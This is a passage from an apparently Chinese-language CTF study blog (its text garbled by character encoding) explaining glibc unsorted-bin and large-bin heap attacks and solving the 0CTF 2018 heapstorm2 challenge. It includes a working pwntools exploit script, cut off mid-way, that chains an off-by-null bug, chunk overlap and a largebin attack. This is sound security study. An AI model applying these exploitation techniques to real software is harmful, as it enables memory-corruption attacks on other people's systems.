0x7f1c705ffb78ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰è¾“å‡ºçš„ä¿¡æ¯ã€‚</strong> </p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">We</span> free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to <span class="hljs-number">0</span>x<span class="hljs-number">7</span>f<span class="hljs-number">1</span>c<span class="hljs-number">705</span>ffb<span class="hljs-number">78</span><br><span class="hljs-attribute">Now</span> emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br><span class="hljs-attribute">And</span> we write it with the target address-<span class="hljs-number">16</span> (in <span class="hljs-number">32</span>-bits machine, it should be target address-<span class="hljs-number">8</span>):<span class="hljs-number">0</span>x<span class="hljs-number">7</span>ffe<span class="hljs-number">0</span>d<span class="hljs-number">232508</span><br><br><span class="hljs-attribute">Let</span>&#x27;s malloc again to get the chunk we just free. During this time, target should has already been rewrite:<br><span class="hljs-attribute">0x7ffe0d232518</span>: <span class="hljs-number">0</span>x<span class="hljs-number">7</span>f<span class="hljs-number">1</span>c<span class="hljs-number">705</span>ffb<span class="hljs-number">78</span><br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° unsorted bin attack ç¡®å®å¯ä»¥ä¿®æ”¹ä»»æ„åœ°å€çš„å€¼ï¼Œä½†æ˜¯æ‰€ä¿®æ”¹æˆçš„å€¼å´ä¸å—æˆ‘ä»¬æ§åˆ¶ï¼Œå”¯ä¸€å¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œè¿™ä¸ªå€¼æ¯”è¾ƒå¤§ã€‚<strong>è€Œä¸”ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ2.28ç‰ˆæœ¬å·²ç»æ— æ•ˆ</strong> </p><p>é€šè¿‡è¿™ä¸ªæ–¹æ³•ä½ å¯ä»¥ : </p><ul><li>é€šè¿‡ä¿®æ”¹å¾ªç¯çš„æ¬¡æ•°æ¥ä½¿å¾—ç¨‹åºå¯ä»¥æ‰§è¡Œå¤šæ¬¡å¾ªç¯ã€‚</li><li>ä¿®æ”¹ heap ä¸­çš„ <code>global_max_fast</code> æ¥ä½¿å¾—æ›´å¤§çš„ chunk å¯ä»¥è¢«è§†ä¸º fast binï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å»æ‰§è¡Œä¸€äº› fast bin attack äº†ã€‚</li></ul><h1 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/">Wiki</a> </p><blockquote><h5 id="å…³äºæŒ‡å®šlibcè°ƒè¯•"><a href="#å…³äºæŒ‡å®šlibcè°ƒè¯•" class="headerlink" title="å…³äºæŒ‡å®šlibcè°ƒè¯•:"></a>å…³äºæŒ‡å®šlibcè°ƒè¯•:</h5><ol><li>ä¿®æ”¹elfæ–‡ä»¶ä½¿ç”¨æŒ‡å®šlibc: <code>./chlibc ctest 2.27</code> </li></ol><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>if [ $# -ne 2 ]; then<br> echo Need two arguments!<br> exit 128<br>fi<br>version=$2<br>binary=$1<br>libc_path=`find /glibs -type d -regex &quot;/glibs/$version.*amd64&quot;`<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$libc_path</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-built_in">exit</span></span><br><br>patchelf --set-interpreter &quot;$libc_path/ld-linux-x86-64.so.2&quot; $binary<br>patchelf --set-rpath $libc_path $binary<br><br>echo ldd output:<br>ldd $binary<br></code></pre></div></td></tr></table></figure><ol start="2"><li>gdbä¸­ç›´æ¥æ‰“å¼€, ä½¿ç”¨listæŸ¥çœ‹æºä»£ç æ‰€å¯¹åº”æ–‡ä»¶, ä¸€èˆ¬è®¾ç½®ä¸º<code>dir /glibs/glibc-2.27/stdio-common/</code>å³å¯.</li></ol><p><a href="https://sourceware.org/gdb/download/onlinedocs/gdb/Source-Path.html#Source-Path">GDB Source-path Doc</a> or <a href="https://www.jianshu.com/p/1a966b62b3d4">make glibc from src</a> </p></blockquote><ul><li>åˆ©ç”¨æ¥æº: unsorted binå¾ªç¯ä¸­æŠŠchunkæ’å…¥åˆ°large binæ—¶æ²¡æœ‰æ£€æŸ¥é“¾è¡¨å®Œæ•´æ€§.<br>ä¸»è¦åˆ©ç”¨<code>bck-&gt;fd = victim</code> å’Œ <code>fwd-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>, fwdæ˜¯ä»å·¦åˆ°å³éå†å‡ºçš„ç¬¬ä¸€ä¸ªå°äºnbçš„chunk, bckæ˜¯å…¶å·¦è¾¹ä¸€ä¸ªchunk. </li><li>æ•ˆæœ: å¯ä»¥å°†(è‡³å°‘æ˜¯ç¬¬ä¸‰ä¸ªä¹‹åçš„)chunkçš„åœ°å€å†™åˆ°ä»»æ„ä½ç½®å¤„. å¯ä»¥åç§»å‡ å­—èŠ‚ä½¿å¾—æœ€é«˜ä½çš„æ•°å­—å¡«å…¥sizeåŸŸ. </li><li>å‰æ: <ul><li>UAF, æˆ–è€…æ˜¯chunk overlappingå¸¦æ¥çš„ä¿®æ”¹æ•´ä¸ªchunkçš„èƒ½åŠ›. </li><li>æœ€å¤§èƒ½malloc large bin.</li><li>å¯¹æ•´ä¸ªchunkçš„æ§åˆ¶, èƒ½å†™åˆ°headerä¸­çš„sizeåŸŸ.</li></ul></li><li>è¿‡ç¨‹:<ol><li>mallocä¸‰ä¸ªchunk, åˆ†åˆ«ä¸ºsmall binå’Œä¸¤ä¸ªlarge bin. åˆ†é…å®Œmalloc(0x20)é˜²æ­¢åˆå¹¶.ä»¥chunk size = 0x3f0ä¸ºåˆ†ç•Œ.  </li><li>free 1å’Œ2, æ”¾åˆ°äº†unsorted binä¸­.</li><li>ç„¶åmalloc(0x90), 2ç§»åˆ°large binä¸­, chunk 1è¢«æ‹¿å‡ºåˆ†å‰²åå‰©ä½™éƒ¨åˆ†æ”¾åˆ°unsorted bin. </li><li>free 3, åŠ å…¥åˆ°unsorted bin, ç°åœ¨3å’Œåˆ†å‰²åçš„1éƒ½åœ¨è¿™é‡Œ. </li><li>ä¿®æ”¹2(UAF), ä¿®æ”¹sizeå˜æˆå°äº3çš„ä¸€ä¸ªchunk. IS_MMAPEDç½®0, bkå’Œbk_nextsizeæŒ‡é’ˆæŒ‡å‘<strong>ç›®æ ‡åœ°å€</strong>. </li><li>malloc(0x90), æ­¤æ—¶æ‹¿å‡ºä¸€åŠçš„1ç»§ç»­åˆ†å‰², 3åŠ å…¥large binä¸­, 2ä¸­å¡«å…¥çš„ä¸¤ä¸ªåœ°å€åŠ ä¸Šåç§»(å› ä¸ºåœ°å€è¢«å½“æˆchunk)è¢«è¦†ç›–æˆ3çš„åœ°å€. </li><li>åˆ©ç”¨å®Œæ¯•.</li></ol></li><li>æ³¨æ„: <ul><li>æ·»åŠ å°chunkæ¥é˜²æ­¢consolidation. </li><li>æœ‰<strong>ä¸¤ç§åˆ©ç”¨æ–¹æ³•</strong>, åŠ å…¥çš„largeçš„chunkå¤§äºæˆ–è€…å°äºå½“å‰æœ€å°chunkå„ä¸ºä¸€ç§æ–¹æ³•. è¿™é‡Œçš„è¿‡ç¨‹ä½¿ç”¨çš„æ˜¯å¤§äº.</li></ul></li><li>ç‰ˆæœ¬å˜åŒ–: <ul><li>2.30åŠ å…¥äº†å¯¹large binè·³è¡¨æ£€æŸ¥, ä¹Ÿå°±æ˜¯åœ¨chunkå¤§äºlarge binä¸­æœ€å°çš„é‚£ä¸€ä¸ªæ—¶è¿›è¡Œæ£€æŸ¥, å¦‚æœfwdçš„bck-&gt;fwdä¸æ˜¯è‡ªèº«, å°±æŠ¥é”™.<br><strong>åªèƒ½ä½¿ç”¨å°äºçš„é‚£ä¸€ç§æ–¹æ³•</strong>. </li></ul></li></ul><h3 id="heapstorm"><a href="#heapstorm" class="headerlink" title="heapstorm"></a>heapstorm</h3><p>èœå•é¢˜. ç»ƒç»ƒæ‰‹. æ€ä¹ˆè¿™ä¹ˆå¥‡æ€ªâ€¦.. æºæ–‡ä»¶<a href="https://github.com/willinin/0ctf2018/tree/master/heapstorm2">é“¾æ¥</a> </p><p>ä¿æŠ¤å…¨å¼€. å®Œå…¨æ²¡æœ‰ç¬¦å·, ä¸€ä¸ªä¸ªå‡½æ•°çš„é‡å‘½å. ä¿®æ”¹alarmçš„æ—¶é—´. </p><ul><li>å¼€å¤´ä¸€ä¸ª<code>mallopt(M_MXFAST, 0)</code>(åœ¨malloc.h)ç¦ç”¨äº†fastbin, ä¹Ÿå°±æ˜¯å°†fastbinå¤„ç†çš„å—å¤§å°ä¸Šé™è®¾ç½®ä¸º0. </li><li>mmap 0x13370000å¤„çš„ä¸€ä¸ªpage, åœ¨0x13370800å†™å…¥0x18(3 qword)å­—èŠ‚çš„éšæœºæ•°. 0x13370818åèµ‹å€¼ä¸ºç¬¬ä¸‰ä¸ªqword. ç»“å°¾åœ¨0x0820.<br>ä»0x0820å¼€å§‹, è¿ç»­16ä¸ª0x10å­—èŠ‚è¢«èµ‹å€¼æˆç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªqword. </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">0x13370800</span>:     a1      a2<br><span class="hljs-number">0x13370810</span>:     a3      a3<br><span class="hljs-comment">//æ¯è¡Œtxä¸ä¸€å®šç›¸ç­‰. </span><br></code></pre></div></td></tr></table></figure><ul><li>alloc: <ul><li>éå†ä¸Šé¢t2, ç›´åˆ°æŸä¸ªæ•°å€¼å’Œa2ç›¸ç­‰. </li><li><code>v2 &gt; 12 &amp;&amp; v2 &lt;= 4096</code> sizeé™åˆ¶. </li><li>calloc(æ³¨æ„è¿™ä¸ªä¼šå°†å†…å®¹æ¸…ç©º)ä¹‹åå°†, <code>t1 = a1 ^ calloc_addr</code>, <code>t2 = a2 ^ size</code>. </li></ul></li><li>update:<ul><li>idxåœ¨0-15ä¹‹é—´, <code>a2 != t2</code>. </li><li><code> size &lt; (a2 ^ t2 - 12)</code>. <code>addr = a1 ^ t1</code> </li><li>å¾€åœ°å€<code>addr</code>é‡Œå†™å…¥sizeé•¿åº¦çš„æ•°å€¼, æœ€åç´§è·Ÿç€strcpyä¸€ä¸ªâ€HEAPSTORM_IIâ€å­—ç¬¦ä¸². è¿™ä¸ªå­—ç¬¦ä¸²é•¿ä¸º12. </li></ul></li><li>delete:<ul><li>ä»t1ä¸­å¼‚æˆ–è§£å‡ºchunkçš„åœ°å€. free. </li><li>æ¢å¤t1 and t2. </li></ul></li><li>view:<ul><li>ä¸¤ä¸ªa3è¦ä¿®æ”¹æˆa4 a5, æ»¡è¶³ä¸¤è€…å¼‚æˆ–==0x13377331. </li><li>ä»t1å’Œt2è§£å‡ºåœ°å€å’Œé•¿åº¦, è¾“å‡ºåˆ°stdout. </li></ul></li></ul><p>æœ€é‡è¦çš„é—®é¢˜åœ¨äºupdateçš„æ—¶å€™è¯»å–é•¿åº¦ä¸ºlen-12, è€ŒHEAPSTORM_IIè¿™ä¸ªå­—ç¬¦ä¸²è¿˜å¸¦æœ‰ä¸€ä¸ªç©ºå­—ç¬¦ä¼šè¢«strcpyå¤åˆ¶, é€ æˆäº†NULL byte off-by-oneæ¼æ´. </p><p><del>è¿™ä¸ªNULLæº¢å‡ºåªèƒ½ä¿®æ”¹prevsizeçš„æœ€ä½å­—èŠ‚ä¸ºç©º. ä¹Ÿå°±æ˜¯æŠŠchunk0çš„sizeå˜å°.</del> </p><p><del>å¦‚æœå˜å°äº†, è€Œä¸”prev_inuseä½ä¹Ÿè¢«æ¸…ç©º, é‚£ä¹ˆfreeæ‰chunk1çš„æ—¶å€™å°±ä¼šå¾€å‰åˆå¹¶ä¸€ä¸ªæ¯”å®é™…å°çš„chunk(å½“ç„¶fake chunk0çš„sizeè¦ç¬¦åˆprev_sizeçš„å€¼), fdå’Œbk(æˆ–è€…åŠ ä¸Šfd_nextsize bk_nextsize)å°±è¢«å¡«å…¥chunk0çš„åŒºåŸŸå†…,  æ³¨æ„ä¸‹æœ€å12ä¸ªå­—èŠ‚ä¸å¯ç”¨, äºæ˜¯å°±å¯ä»¥ä¿®æ”¹æˆ–è¯»å–å…¶å†…çš„å†…å®¹, æˆ–è€…åœ¨é‡æ–°mallocä¹‹åä¿®æ”¹chunk1çš„header.</del> </p><p>è¿™é¢˜å±å®è¶…ä¹æˆ‘çš„æƒ³è±¡, è¿™å¤æ‚åº¦çœŸæ˜¯å¤Ÿå¯ä»¥çš„, å¯¹ç€åˆ«äººå°‘äº†åä¸‡å…«åƒå­—çš„è½¬è½½æºç ç ”ç©¶äº†åŠå¤©ç»ˆäºå®Œå…¨çœ‹æ‡‚äº†, ç„¶åçœ‹åˆ°æ–‡ç« ç»“å°¾ä¸€ä¸ªå‚è€ƒèµ„æ–™, tmå¤åˆ¶éƒ½ä¸å¼„ä¸ªå®Œæ•´çš„. </p><p>åŸç‰ˆ: <a href="https://bbs.pediy.com/thread-225973.htm">link</a> </p><p>å­¦ä¹ åˆ°çš„ç‚¹åˆ—ä¸¾ä¸€ä¸‹:</p><ul><li>å¼€å¤´ä¸¤ä¸ªchunk shrinkæ“ä½œ, é€šè¿‡off-null-byteæ”¹å°chunkçš„sizeåŸŸåˆ¶é€ äº†ä¸€ä¸ªç©ºéš™æ¥å®ç°chunk overlap, é€šè¿‡7æ§åˆ¶2, 8æ§åˆ¶4. </li><li>84è¡Œæ—¶binä¸­æœ‰ä¸¤ä¸ªchunk, 4åœ¨large bin, 2åœ¨unsorted bin. æŒ‰ä¸€èˆ¬large_bin_attackæµç¨‹æ˜¯åˆ©ç”¨ç¬¬ä¸‰ä¸ªchunkæ¥æŠŠunsortedæ”¾åˆ°largeå®Œæˆchunkçš„æŒ‡é’ˆä»»æ„å†™, å°†ç›®æ ‡chunkçš„sizeæ”¹æˆäº†56(é€šè¿‡ä¸æ–­å°è¯•aslråˆ°56), ä½†æ˜¯è¿™é‡Œæ”¹å†™äº†2, å¯¼è‡´2çš„å·¦è¾¹ä¸€ä¸ªå°±æ˜¯0x133707e0, å†å·¦è¾¹æ²¡æœ‰è®¾ç½®æŒ‡é’ˆ, å¯æƒ³è€ŒçŸ¥unsorted binå¤§å¾ªç¯æœ€ç»ˆä¼šå‡ºé”™. ä¸è¿‡åˆ©ç”¨å¤§å¾ªç¯ä¸­çš„æ‰¾åˆ°exact fitå°±ç«‹åˆ»é€€å‡ºçš„ç‰¹æ€§, åªè¦alloc(0x48)å°±å¯ä»¥è¾¾åˆ°åœ¨æŒ‡å®šä½ç½®malloc chunkçš„ç›®çš„. è¿˜è¦æ³¨æ„çš„æ˜¯unsortedè„±é“¾çš„æ—¶å€™ä»å³åˆ°å·¦éå†, ä¼šå°†headerçš„bkè®¾ç½®ä¸ºvictimçš„bk, æ‰€ä»¥åœ¨ä¹‹å‰çš„largebin attackä¸­é™¤äº†sizeåŸŸè¿˜è®¾ç½®äº†bkæŒ‡é’ˆä¸ºä¸€ä¸ªçœŸå®chunk, å³å¯é¿å…seg fault</li><li>æ‰€ä»¥largebin attackåŠ ä¸Šunsorted binå¾ªç¯åˆ©ç”¨è¿˜å¯ä»¥å®ç°æŒ‡å®šä½ç½®åˆ†é…å †å—. </li><li>ç„¶åå°±å®Œæˆäº†ä»»æ„è¯»å†™çš„åŠŸèƒ½, è¯»ä¸ªheapæŒ‡é’ˆç„¶åå®šä½åˆ°æŸä¸ªlargebinä¸­chunkçš„fd_nextsizeæŒ‡é’ˆå°±å¯ä»¥æ‰¾åˆ°libcåŸºå€, æ”¹å†™__free_hook(ç”±äºRELRO). </li></ul><p>æ­£å¥½ä¹Ÿç¡®å®æ˜¯é‚£å¥è¯, largebin attackåªæ˜¯æ”»å‡»ä¸­çš„ä¸€ç¯, è¿˜è¦ç»“åˆå…¶ä»–æŠ€æœ¯æ‰èƒ½å®ç°åˆ©ç”¨, è¿™ä¸€é¢˜å°±ç”¨äº†off-null-byte + chunk overlapping + largebin attack + unsortedbinå¤§å¾ªç¯.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br> <br>context.binary = <span class="hljs-string">&#x27;./heapstorm2&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x) <br>p = <span class="hljs-literal">None</span><br>elf = ELF(<span class="hljs-string">&#x27;/glibs/2.24-3ubuntu1_amd64/libc-2.24.so&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">g</span>():</span><br>    pwnlib.gdb.attach(p)<br>    raw_input()<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    sl(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index,size,content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>,timeout=<span class="hljs-number">1</span>)<br>    sl(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>,timeout=<span class="hljs-number">1</span>)<br>    sl(content)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    sl(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view</span>(<span class="hljs-params">index</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    sl(<span class="hljs-string">&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">&#x27;Chunk[1]: &#x27;</span>)<br>    <span class="hljs-keyword">return</span> p.recv()<br> <br>base = <span class="hljs-number">0x13370800</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&#x27;./heapstorm2&#x27;</span>)<br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0x508</span>)   <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x508</span>)   <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#5</span><br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#6  </span><br>    <br>    <span class="hljs-comment"># è¿™ä¸€è¡Œæ„ä¹‰ä¸æ˜, å¯èƒ½ä¸ºäº†æ–¹ä¾¿ä¸€ç‚¹ç‚¹ç‚¹è°ƒè¯•</span><br>    <span class="hljs-comment"># ä¸»è¦æ˜¯ä¸‹ä¸€ä¸ªchunkçš„prev_sizeåŸŸåœ¨mallocçš„è¿‡ç¨‹ä¸­åªæœ‰å†™å…¥, è€Œæ²¡æœ‰è¯»å–å¹¶æ£€æŸ¥å…¶å†…å®¹. </span><br>    <span class="hljs-comment"># edit(1,(0x4f0+8),b&#x27;A&#x27;*(0x4f0)+p64(0x500))</span><br>    free(<span class="hljs-number">1</span>)<br>    edit(<span class="hljs-number">0</span>,(<span class="hljs-number">0x18</span>-<span class="hljs-number">12</span>),<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x18</span>-<span class="hljs-number">12</span>))<br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x4d8</span>)   <span class="hljs-comment">#7   to be overlapped by 1</span><br>    free(<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">2</span>)<br>    <span class="hljs-comment">#occupy original position of chunk 1 2, now heap is full without free chunk</span><br>    <span class="hljs-comment"># we can use 7 to control 2.</span><br>    <span class="hljs-comment"># chunk 2 header is in chunk7 of (user_pointer+0x10), </span><br>    <span class="hljs-comment"># that is the reason of line91&#x27;s double qword</span><br>    add(<span class="hljs-number">0x30</span>)    <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x4e8</span>)   <span class="hljs-comment">#2</span><br> <br>    free(<span class="hljs-number">4</span>)<br>    edit(<span class="hljs-number">3</span>,(<span class="hljs-number">0x18</span>-<span class="hljs-number">12</span>),<span class="hljs-string">b&#x27;B&#x27;</span>*(<span class="hljs-number">0x18</span>-<span class="hljs-number">12</span>))<br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x4d8</span>)   <span class="hljs-comment">#8   to be overlapped by 4</span><br>    free(<span class="hljs-number">4</span>)<br>    free(<span class="hljs-number">5</span>)<br>    add(<span class="hljs-number">0x40</span>)    <span class="hljs-comment">#4</span><br> <br>    <span class="hljs-comment"># move 0x4e0 from unsorted bin to large bin through free and remalloc 2.</span><br>    <span class="hljs-comment"># now we can use 8 to control freed 0x4e0</span><br>    <span class="hljs-comment"># this can be used in largebin attack.</span><br>    free(<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">0x4e8</span>)<br>    free(<span class="hljs-number">2</span>)<br> <br>    <span class="hljs-comment">#åœ¨unsorted binä¸­å–å‡ºchunkçš„æ—¶å€™, ä»å³å¾€å·¦éå†, æœ€å³è¾¹chunk-&gt;bk-&gt;fd=unsorted_chunks(av)</span><br>    <span class="hljs-comment">#ä¹Ÿå°±æ˜¯unsorted binçš„head. åœ¨è¿™é‡Œçš„æ•ˆæœæ˜¯chunkçš„bkçš„fd(ä¹Ÿå°±æ˜¯base-0x20+0x10)è¢«èµ‹å€¼, ä¹Ÿæ²¡æœ‰æ£€æŸ¥åˆæ³•æ€§.</span><br>    <span class="hljs-comment">#å¦åˆ™å°±ä¼šå‡ºç°segmentation fault.</span><br>    <span class="hljs-comment">#å¯æƒ³è€ŒçŸ¥, æˆ‘ä»¬å¹¶ä¸çŸ¥é“binçš„å¤´ç»“ç‚¹, ä¸å¯èƒ½ä¸€ç›´åœ¨è¿™æ¡é“¾ä¸Šä¸€ç›´éå†ä¸‹å». ä½†ç”³è¯·çš„æ˜¯0x50çš„chunk,</span><br>    <span class="hljs-comment">#åˆšå¥½exact fit, é©¬ä¸Šè¢«å–å‡º. æˆåŠŸfakeäº†ä¸€ä¸ªchunk. </span><br>    payload1 = <span class="hljs-number">2</span>*p64(<span class="hljs-number">0x0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4f1</span>)+p64(<span class="hljs-number">0</span>)+p64(base-<span class="hljs-number">0x20</span>)<br>    edit(<span class="hljs-number">7</span>,<span class="hljs-built_in">len</span>(payload1),payload1)<br> <br>    payload2 = <span class="hljs-number">4</span>*p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4e1</span>)+p64(<span class="hljs-number">0</span>)+p64(base-<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)+p64(base-<span class="hljs-number">0x20</span>-<span class="hljs-number">0x18</span>-<span class="hljs-number">5</span>)<br>    edit(<span class="hljs-number">8</span>,<span class="hljs-built_in">len</span>(payload2),payload2)<br> <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment">#0x48 to chunksize is 0x50, which is same as 0x56 no_mask version</span><br>            <span class="hljs-comment"># gdb.attach(p)</span><br>            add(<span class="hljs-number">0x48</span>)     <span class="hljs-comment">#2</span><br>            p.clean()<br>            sl(<span class="hljs-string">b&#x27;what?&#x27;</span>)<br>            log.success(<span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>            <br>        <span class="hljs-keyword">except</span> EOFError:<br>            <span class="hljs-comment"># otherwise crash and try again</span><br>            <span class="hljs-comment"># why would crash happen? because the check after calloc call _int_malloc</span><br>            <span class="hljs-comment"># which is `assert( !mem || chunk_is_mmap(mem2chunk(mem)) || av == arena_for_chunk(mem2chunk(mem)) )`</span><br>            <span class="hljs-comment"># if the IS_MMAPED flag is not true, then the assertion will fail. </span><br>            <span 